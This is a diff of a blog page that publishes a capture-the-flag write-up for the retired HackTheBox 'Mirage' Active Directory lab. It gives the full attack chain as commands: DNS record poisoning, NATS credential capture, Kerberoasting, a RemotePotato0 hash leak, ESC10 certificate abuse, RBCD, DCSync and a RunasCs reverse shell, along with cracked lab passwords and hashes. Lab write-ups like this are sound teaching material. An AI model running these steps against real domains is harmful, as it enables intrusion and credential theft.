@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Mirage - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Mirage.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Mirage machine from HackTheBox - Hard difficulty level">
+    <meta name="description" content="Detailed writeup for Mirage machine from HackTheBox - Hard difficulty level">
     <meta name="keywords" content="HackTheBox, Mirage, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,202 @@
         <h1 class="writeup-title">Mirage</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active machine</span>
+            <span class="date">November 22, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Mirage" src="../images/Mirage/pwned.png" /></p>
-<p>Mirage is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Mirage retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Mirage/pwned.png" /></p>
+<p>Mirage was a hard-difficulty Windows Active Directory box that began with exploiting unauthenticated dynamic DNS updates to poison the missing nats-svc.mirage.htb record, redirecting NATS authentication traffic to capture Dev_Account_A credentials.
+Using these NATS-specific credentials with a client, I enumerated JetStream message streams to discover david.jjackson's domain credentials in authentication logs.</p>
+<p>As david.jjackson, I performed Kerberoasting against nathan.aadam (who had an SPN set) and cracked his TGS ticket to obtain his password "3edc#EDC3".
+With WinRM access as nathan.aadam, I discovered mark.bbond's username in the autologon registry and confirmed an active logon session using RunasCs to bypass evil-winrm's limitations.
+I executed a Cross-Protocol Hash Leak attack using RemotePotato0 with socat relay to force mark.bbond's NTLM authentication through DCOM, capturing and cracking his NetNTLMv2 hash to reveal the pass "1day@atime".</p>
+<p>As mark.bbond, I exploited write permissions on javier.mmarshall's UAC and logonhours attributes to enable his disabled account and allow authentication. After forcing a password reset on javier.mmarshall, I used his ReadGMSAPassword permission to extract the Mirage-Service$ account hash remotely via netexec.
+With GenericWrite over mark.bbond, I exploited ESC10 (weak certificate mapping with CertificateMappingMethods set to 0x4) by manipulating mark.bbond's UPN to DC01$@mirage.htb, requesting a certificate, then using certipy's LDAP shell functionality to authenticate as the DC over LDAPS despite security extensions being enabled.</p>
+<p>From the LDAP shell, I configured Resource-Based Constrained Delegation on DC01$ to trust nathan.aadam (who had an existing SPN), then used impacket-getST to impersonate DC01$ itself after Administrator impersonation failed due to built-in protections.
+Finally, I performed a DCSync attack with secretsdump to extract the Administrator's NTLM hash "7be6d4f3c2b9c0e3560f5a29eeb1afb3" and authenticated via Kerberos with impacket-getTGT to achieve domain compromise.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Mirage/nmap.png" /></p>
+<p>Initial nmap scan reveals the DC hostname, domain name, nfs on port 2049, and quite a few other ports. I'll start off by taking a look at the network share.</p>
+<h2>Network share examination</h2>
+<p><code>showmount -e 10.10.11.78</code></p>
+<p><img alt="share" src="../images/Mirage/share.png" /></p>
+<p>The <code>MirageReports</code> share is accessible to everyone. I'll mount it onto my host.</p>
+<p><code>sudo mount -t nfs 10.10.11.78:/MirageReports /tmp/MirageReports</code></p>
+<p><img alt="copy" src="../images/Mirage/copy.png" /></p>
+<p>There are 2 PDF files inside. The first one, <code>Incident_Report_Missing_DNS_Record_nats-svc.pdf</code>, describes an incident related to the <code>nats-svc.mirage.htb</code> hostname missing within the internal network due to automatic removal of DNS records that are not refreshed within 14 days.</p>
+<p><img alt="security" src="../images/Mirage/security.png" /></p>
+<p>This note is a huge clue as to how this problem could be used to my advantage. However, I don't have any users for the domain yet, so the easiest way is out of the window.</p>
+<p>The other PDF mentions that NTLM authentication is monitored, and that Kerberos is the preferred auth method. I'll keep this in mind.</p>
+<h2>Adding the malicious DNS record without credentials</h2>
+<p>I will check whether I can add DNS without authentication. Normally, this would not be possible, but there may be a misconfiguration on the server that could allow this. It's worth a try.</p>
+<p><code>dig @10.10.11.78 nats-svc.mirage.htb</code></p>
+<p><img alt="dig" src="../images/Mirage/dig.png" /></p>
+<p>Right now, the nats-svc record does not exist within the domain. I'll use nsupdate to try to add it, with the IP pointing back to my box.</p>
+<pre class="codehilite"><code>└─$ nsupdate
+&gt; server 10.10.11.78
+&gt; zone mirage.htb
+&gt; update add nats-svc.mirage.htb. 60 A 10.10.16.213 | Add an A DNS record with the specified data, with a lifetime of 60 seconds(TTL)
+&gt; send
+&gt; quit
+</code></pre>
+
+<p><img alt="worked" src="../images/Mirage/worked.png" /></p>
+<p>And this worked! Now every time a service tries to resolve nats-svc.mirage.htb, it will be pointed back to my box. In order to actually capture authentication attempts from the automated services, one more step must be performed.</p>
+<p>I downloaded the nats-server binary from the kali apt repository. I'll make it listen on all addresses(0.0.0.0) and on port 4222(default).</p>
+<p><code>nats-server -p 4222 --addr 0.0.0.0</code></p>
+<p><img alt="nats" src="../images/Mirage/nats.png" /></p>
+<p>Then, I'll run tcpdump on tun0 and only on port 4222, adding the <code>-A</code> flag to make it print out the ASCII data of each captured packet.</p>
+<p><code>sudo tcpdump -i tun0 -A port 4222</code></p>
+<p>And after adding the DNS record again, a few packets were caught by tcpdump not long after that.</p>
+<p><img alt="creds" src="../images/Mirage/creds.png" /></p>
+<p><code>Dev_Account_A | hx5h7F5554fP@1337!</code></p>
+<p>To confirm whether the credentials are valid for the domain, I'll try to authenticate with netexec.</p>
+<p><code>https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali</code></p>
+<p><img alt="fail" src="../images/Mirage/fail.png" /></p>
+<p>The credentials are invalid. This user cannot authenticate to the domain with this password.</p>
+<h2>Reading the NATS message streams</h2>
+<p>Since I've got these creds from a NATS client trying to authenticate to my server, I will try using them with a client of my own to enumerate the server on mirage.htb.</p>
+<p><code>https://github.com/nats-io/natscli?tab=readme-ov-file#installation</code></p>
+<p><img alt="options" src="../images/Mirage/options.png" /></p>
+<p>I did not know what a <code>JetStream Stream</code> was, so I looked it up online.</p>
+<p><code>https://docs.nats.io/nats-concepts/jetstream</code></p>
+<p>JetStream is a persistence engine built into NATS, which allows for messages to be stored and replayed at a later time. This is just a small snippet of this functionality, but it's enough for me to focus on it for now.</p>
+<p><code>nats -s nats://dc01.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' stream view</code></p>
+<p><img alt="view" src="../images/Mirage/view.png" /></p>
+<p><code>david.jjackson | pN8kQmn6b86!1234@</code></p>
+<p>The only stream I could retrieve comes from the auth log, and reveals a new pair of credentials for David. I'll check them against the domain.</p>
+<p><img alt="test" src="../images/Mirage/test.png" /></p>
+<h2>Kerberoasting nathan.aadams</h2>
+<p><code>bloodyAD -d mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --host dc01.mirage.htb --dc-ip 10.10.11.78 get writable</code></p>
+<p><img alt="noperm" src="../images/Mirage/noperm.png" /></p>
+<p>David himself doesn't have any interesting permissions visible. I'll just go forward with checking every attack path I know, starting with kerberoasting.</p>
+<p><code>impacket-GetUserSPNs -k -dc-ip 10.10.11.78 -dc-host dc01.mirage.htb mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'</code></p>
+<p><img alt="nathan" src="../images/Mirage/nathan.png" /></p>
+<p>Nathan.aadams is a kerberoastable user, meaning I can request a TGS in a crackable format, and potentially crack it with hashcat.</p>
+<p><img alt="remote" src="../images/Mirage/remote.png" /></p>
+<p>Nathan.aadams is in the Remote Management Users group via membership in the IT_Admins OU, making him a very valuable, and currently my only target.</p>
+<p><img alt="tgs" src="../images/Mirage/tgs.png" /></p>
+<p>I'll save this ticket in a separate file, and I will attempt to crack it with hashcat.</p>
+<p><img alt="cracked" src="../images/Mirage/cracked.png" /></p>
+<p><code>nathan.aadams | 3edc#EDC3</code></p>
+<p>Since NTLM auth is not favored, I will request a TGT for Nathan with impacket's getTGT. After exporting the KRB5CCNAME, I'll connect to the machine with evil-winrm.</p>
+<p><img alt="user" src="../images/Mirage/user.png" /></p>
+<h1>Root flag</h1>
+<p>I uploaded SharpHound onto the machine and ingested the data into BloodHound to look for a path forward.</p>
+<h2>Bloodhound enumeration</h2>
+<p><img alt="forcechangepassword" src="../images/Mirage/forcechangepassword.png" /></p>
+<p>mark.bbond can force a password change on javier.mmarshall.</p>
+<p><img alt="readgmsapass" src="../images/Mirage/readgmsapass.png" /></p>
+<p>Javier can read the GMSA password of the Mirage-Services account.</p>
+<p><img alt="mirage-services" src="../images/Mirage/mirage-services.png" /></p>
+<p>And that account is a member of the domain computers group, which can enroll in 3 certificate templates.</p>
+<h2>Cross-Protocol Hash Leak</h2>
+<p>(Note: When initially solving the box, I owned mark.bbond by using the revealed autologon credentials, which contained his password. This has been patched)</p>
+<p>My next step right now is finding a way to own mark.bbond, and then abuse the previously mentioned attack path. Back in my nathan.aadam shell, I'll run winPEAS to get some information about the DC.</p>
+<p><img alt="autologon" src="../images/Mirage/autologon.png" /></p>
+<p>A default username for autologon was found. This functionality is used for automatically logging into a system as a user after startup, and the related data is stored in the registry, under the <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code> key.</p>
+<p><img alt="registry" src="../images/Mirage/registry.png" /></p>
+<p>It's just the username here, but the fact that there <em>is</em> something related to a user here points me towards the possibility that someone else might be logged into the DC. To check this, I'll run the <code>query user</code> or <code>quser</code> command.</p>
+<p><img alt="fail3" src="../images/Mirage/fail3.png" /></p>
+<p>However, this will not work in evil-winrm. The reason for this is that evil-winrm provides a somewhat limited, non-interactive shell (network logon) that does not allow us to interact with Windows functions that require an interactive logon session.</p>
+<p>I can get and use such a session by using RunasCs as nathan.aadam and executing commands in its context. By default, RunasCs will run everything in the context of an interactive (2) logon session.</p>
+<p><code>./RunasCs.exe nathan.aadam '3edc#EDC3'  quser</code></p>
+<p><img alt="logon" src="../images/Mirage/logon.png" /></p>
+<p>Mark.bbond is currently logged into the DC. Knowing this, I can force the user to initiate an NTLM authentication targetted towards any specified destination to receive the target's NetNTLMv2 hash. I will use RemotePotato0 for this attack.</p>
+<p><code>https://github.com/antonioCoco/RemotePotato0</code></p>
+<p>This tool works by abusing the DCOM activation service to trigger the NTLM auth of a selected user. This is then sent over to a cross-protocol relay server that receives the message and transforms it from RPC protocol to authentication over HTTP. It can be further relayed to ntlmrelayx for NTLM relay attacks, or back to RemotePotato0 to capture the hash. The attack will require 2 commands.</p>
+<pre class="codehilite"><code>On attacker Box | sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.78:9999 &lt;- This listener will capture and unpack the initial request from RPC protocol to HTTP, then send it back to 10.10.11.78:9999(RemotePotato0)
+
+On the DC | .\RemotePotato0.exe -m 2 -x 10.10.16.9 -p 9999 -s 1 &lt;- This will first initiate the authentication, then receive the transformed HTTP auth and display back the NetNTLMv2 hash
+</code></pre>
+
+<p>On the attacker box:</p>
+<p><img alt="socat" src="../images/Mirage/socat.png" /></p>
+<p>And on the DC:</p>
+<p><img alt="hash" src="../images/Mirage/hash.png" /></p>
+<p>I'll try to crack this hash with hashcat.</p>
+<p><code>hashcat hash /usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="crackedhash" src="../images/Mirage/crackedhash.png" /></p>
+<p><code>mark.bbond | 1day@atime</code></p>
+<h2>Mark.bbond to javier.mmarshall</h2>
+<p>Checking what objects mark.bbond can modify reveals an interesting entry.</p>
+<p><img alt="write" src="../images/Mirage/write.png" /></p>
+<p>Mark can write into the UAC, and the logonhours properties of javier.mmarshal. The first one contains a value corresponding to the UAC flags set up on the account.</p>
+<p><code>Get-ADUser javier.mmarshall -Properties useraccountcontrol</code></p>
+<p><img alt="uac" src="../images/Mirage/uac.png" /></p>
+<p>This value means that the <code>Disabled, Password Doesn't Expire</code> flags are set for Javier. <code>https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/</code> is a good resource that contains a bunch of UAC flags with their values.</p>
+<p>The <code>disabled</code>UAC flag can be removed remotely with bloodyAD, or from a PS shell with Set-ADUser/Set-ADAccountControl. I'll do it the remote way.</p>
+<p><code>bloodyAD -d mirage.htb --host dc01.mirage.htb -k -u mark.bbond -p "1day@atime" remove uac javier.mmarshall -f ACCOUNTDISABLE</code></p>
+<p><img alt="flag" src="../images/Mirage/flag.png" /></p>
+<h3>Updating javier's logonhours attribute</h3>
+<p>The logonhours attribute controls when the user is allowed to login. I'll compare the values for Mark and Javier to see if they are any different.</p>
+<p><img alt="logonhours" src="../images/Mirage/logonhours.png" /></p>
+<p>Mark can log in at any time, while Javier cannot login at all. Even if I enable the account, this value being all 0s will keep me from being able to login.</p>
+<p>This can be done from the remote shell. I'll update Javier's logonhours by copying the byte array from Mark, but first, I'll have to get a shell as Mark. Trying to use WinRM to remote into the machine fails at SPNEGO negotiation, but having Mark's credentials allows me to send myself a shell with RunasCs.</p>
+<p><code>./RunasCs.exe mark.bbond "1day@atime" powershell -r 10.10.16.213:9001</code></p>
+<p><img alt="shell" src="../images/Mirage/shell.png" /></p>
+<p>I'll take the bytes stored in Mark's attribute, and I'll save them in the $LogonHoursBytes variable.</p>
+<p><code>$LogonHoursBytes = Get-ADUser -Identity "mark.bbond" -Properties LogonHours | Select-Object -ExpandProperty LogonHours</code></p>
+<p>However, trying to insert this value like that will fail with the <code>Invalid type 'System.Management.Automation.PSObject'</code> error. This indicates that the variable is holding a powershell object (PSObject) instead of the required raw byte array. I can force the output into a byte array type by adding <code>[byte[]]</code> before my previous command.</p>
+<p><code>[byte[]]$LogonHoursBytes = Get-ADUser -Identity "mark.bbond" -Properties LogonHours | Select-Object -ExpandProperty LogonHours</code></p>
+<p><img alt="bytesfix" src="../images/Mirage/bytesfix.png" /></p>
+<p>The 2 values seem to be identical, but I'll try to insert the value again.</p>
+<p><code>Set-ADUser -Identity "javier.mmarshall" -Replace @{LogonHours = $LogonHoursBytes}</code></p>
+<p><img alt="replaced" src="../images/Mirage/replaced.png" /></p>
+<p>Now that both of the problems have been solved, I'll proceed with taking over Javier. From the previous BloodHound enumeration, I know that Mark can force a password change on Javier.</p>
+<p><code>bloodyAD -d mirage.htb --host dc01.mirage.htb -k -u mark.bbond -p "1day@atime" set password javier.mmarshall Password123</code></p>
+<p><img alt="spnego" src="../images/Mirage/spnego.png" /></p>
+<p>Same scenario as before, but here I could not get a shell with RunasCs, because the logon type 2 was not granted to Javier.</p>
+<p><code>[-] RunasCsException: Selected logon type '2' is not granted to the user 'javier.mmarshall'. Use available logon type '3'.</code></p>
+<h2>Reading the GMSA password</h2>
+<p>This doesn't stop me from using his privileges, though, as I can read the GMSA passwords remotely by using netexec.</p>
+<p><img alt="gmsa" src="../images/Mirage/gmsa.png" /></p>
+<p><code>Mirage-Service$ | 738eeff47da231dec805583638b8a91f</code></p>
+<h2>Exploiting ESC10</h2>
+<p>Looking at the permissions, I can see that Mirage-Service has GenericWrite over mark.bbond.</p>
+<p><img alt="genericwrite" src="../images/Mirage/genericwrite.png" /></p>
+<p>This means that it can write into every attribute of mark.bbond, like his SPN or his UPN. Aside from targeted kerberoasting, this is often used with certificate attacks like ESC9(No Security Extension) or ESC16(Security Extension Disabled On CA (Globally)). During my BloodHound enumeration, I saw a bunch of certificates, as well as a CA on the domain, which means that ADCS 100% exists on the domain.</p>
+<p><code>certipy-ad find -enabled -vulnerable -dc-ip 10.10.11.78 -dc-host dc01.mirage.htb -u 'Mirage-Service$' -k -no-pass</code></p>
+<p><img alt="novuln" src="../images/Mirage/novuln.png" /></p>
+<p>Certipy returns no vulnerable templates, but this doesn't mean that I can't use the GenericWrite at all. I'll look through the ESC attacks manually to see if some of them are not displayed by certipy.</p>
+<p><code>https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication</code></p>
+<p>ESC10 is not displayed by certipy's find command, but the determinant registry key can be checked under <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\</code></p>
+<p><code>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\</code></p>
+<p><img alt="regkeys" src="../images/Mirage/regkeys.png" /></p>
+<p>The <code>CertificateMappingMethods</code> value is set to 0x4, confirming the DC as vulnerable to ESC10. I'll try to attack the administrator account.</p>
+<p><img alt="admin" src="../images/Mirage/admin.png" /></p>
+<p>Administrator already has an UPN set, which makes them an untargettable user for this attack. Certipy wiki mentions attacking the DC account as it has no UPN set by default, which I'll try right now.</p>
+<p><code>certipy-ad account read -user DC01 -dc-ip 10.10.11.78 -dc-host dc01.mirage.htb -u 'Mirage-Service$' -k -no-pass</code></p>
+<p><img alt="upns" src="../images/Mirage/upns.png" /></p>
+<p>I'll keep Mark's UPN in mind, as it'll have to be restored later to avoid name mismatch errors while authenticating with the certificate. I'll add the DC's samAccountName to Mark's UPN property with bloodyAD.</p>
+<p><code>bloodyAD -d mirage.htb --host dc01.mirage.htb -k -u 'Mirage-Service$' set object mark.bbond userPrincipalName -v 'DC01$@mirage.htb'</code></p>
+<p><img alt="added" src="../images/Mirage/added.png" /></p>
+<p>I'll revert Mark's UPN to its original value with <code>bloodyAD -d mirage.htb --host dc01.mirage.htb -k -u 'Mirage-Service$' set object mark.bbond userPrincipalName -v mark.bbond@mirage.htb</code>, and then I'll try authenticating with the cert as the DC.</p>
+<p><img alt="fail2" src="../images/Mirage/fail2.png" /></p>
+<p>This failed because of he security extensions being enabled. The SID in that certificate belongs to mark.bbond, so it will always be rejected. The attack targets weak certificate mapping in Schannel specifically, and this can be abused when connecting to LDAPS. Certipy has this functionality, and I'll use it to get an LDAP shell as the DC.</p>
+<p><code>certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -domain mirage.htb -ldap-shell</code></p>
+<p><img alt="ldapshell" src="../images/Mirage/ldapshell.png" /></p>
+<h2>RBCD as nathan.aadam</h2>
+<p>I can set RBCD(Resource-Based Constrained Delegation) on the DC from this shell. I need an account with an SPN, and I cannot add a computer account due to the MachineAccountQuota being set to 0.</p>
+<p><code>Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'</code></p>
+<p><img alt="quota" src="../images/Mirage/quota.png" /></p>
+<p>From the users I've taken over so far, one of them had an SPN set. I'll use Nathan.aadam as my target for RBCD as he has the <code>HTTP/exchange.mirage.htb</code> SPN set.</p>
+<p><img alt="rbcd" src="../images/Mirage/rbcd.png" /></p>
+<p><code>impacket-getST -spn CIFS/dc01.mirage.htb -impersonate administrator -k -no-pass -dc-ip 10.10.11.78 mirage.htb/nathan.aadam</code></p>
+<p><img alt="request" src="../images/Mirage/request.png" /></p>
+<p>My initial target for impersonation was the administrator, but this failed with a BADOPTION error. The administrator account is protected from impersonation, likely due to built-in protections for RID 500 or membership in the Protected Users group.</p>
+<p>Instead, I will impersonate the DC01$ itself and then perform a DCsync with impacket's secretsdump.</p>
+<p><code>impacket-getST -spn CIFS/dc01.mirage.htb -impersonate 'DC01$' -k -no-pass -dc-ip 10.10.11.78 mirage.htb/nathan.aadam</code></p>
+<p><img alt="ticket" src="../images/Mirage/ticket.png" /></p>
+<p><code>impacket-secretsdump -k mirage.htb/'DC01$'@dc01.mirage.htb</code></p>
+<p><img alt="secretsdump" src="../images/Mirage/secretsdump.png" /></p>
+<p><code>Administrator | 7be6d4f3c2b9c0e3560f5a29eeb1afb3</code></p>
+<p>The last thing I need to do before connecting as the administrator is requesting a ticket as them. NTLM auth will not work even for the administrative users.</p>
+<p><img alt="root" src="../images/Mirage/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
